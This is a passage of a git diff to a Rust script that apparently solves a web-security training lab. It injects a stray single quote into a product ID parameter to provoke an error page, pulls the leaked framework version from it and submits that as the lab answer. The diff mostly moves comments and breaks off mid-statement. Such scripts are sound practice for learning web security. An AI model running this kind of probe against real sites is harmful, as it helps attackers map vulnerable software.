@@ -28,27 +28,41 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
+    // change this to your lab URL
+    let url = "https://0a3600d603f62f3580f894800013003a.web-security-academy.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
     println!("{} {}", "1. Injecting the payload..".white(), "OK".green());
-    let product_req = client.get(format!("{url}/product?productId=4'")).send(); // inject the payload
+
+    // inject the payload
+    let product_req = client.get(format!("{url}/product?productId=4'")).send();
+
+    // if the request is sent successfully
     if let Ok(res) = product_req {
-        // if the request is sent successfully
-        let body = res.text().unwrap(); // get the body of the response
-        let framework = extract_pattern("Apache Struts 2 2.3.31", &body); // extract the framework name; change this if it is changed in your case
+        // get the body of the response
+        let body = res.text().unwrap();
+
+        // extract the framework name; change this if it is changed in your case
+        let framework = extract_pattern("Apache Struts 2 2.3.31", &body);
+
+        // if the name is found
         if let Some(text) = framework {
-            // if the name is found
             println!(
                 "{} {} => {}",
                 "2. Extracting the framework name..".white(),
                 "OK".green(),
                 text.yellow()
             );
+
+            // submit solution
             let submit_answer = client
                 .post(format!("{url}/submitSolution"))
                 .form(&HashMap::from([("answer", text)]))
-                .send(); // submit solution
+                .send();
+
+            // if submitting is successful
             if let Ok(res) = submit_answer {
                 println!("{} {}", "3. Submitting solution..".white(), "OK".green());
                 println!(
